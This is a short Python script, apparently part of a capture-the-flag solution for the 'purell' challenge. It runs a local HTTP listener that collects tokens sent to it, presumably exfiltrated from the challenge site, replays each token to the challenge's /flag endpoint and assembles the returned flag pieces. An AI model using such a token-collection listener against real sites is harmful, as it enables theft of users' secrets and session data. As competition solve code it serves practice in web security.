import http.server
import socketserver
from urllib.parse import parse_qs, urlparse
import requests
from bs4 import BeautifulSoup

flag = ""

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global flag
        # Extract the query parameters from the URL (GET request)
        query_params = parse_qs(urlparse(self.path).query)
        token = query_params.get('flag', [None])[0]
        
        if token:
            #print(f"Received token: {token}")
            # Send request to the target site with the token and fetch the flag
            response = requests.get("https://purell.chall.lac.tf/flag", params={"flag": token})          
            if response.status_code == 200:
                # Parse the response to extract the flag
                soup = BeautifulSoup(response.text, 'html.parser')
                flag_text = soup.find('span', class_='flag')
                if flag_text:
                    #flag = flag_text.text
                    #print(f"[+] Flag found: {flag}")
                    flag += flag_text.text
                else:
                    #print("[-] Flag not found in response")
                    pass
            else:
                #print(f"[-] Error fetching flag: {response.status_code}")
                pass
        else:
            #print("[-] No flag parameter found in the request")
            pass

def start_server():
    PORT = 8080
    print(f"[+] Server Listening On Port {PORT} (CTRL+C To show The Flag result)")
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\nFLAG: {flag}")
            httpd.server_close()

if __name__ == "__main__":
    start_server()
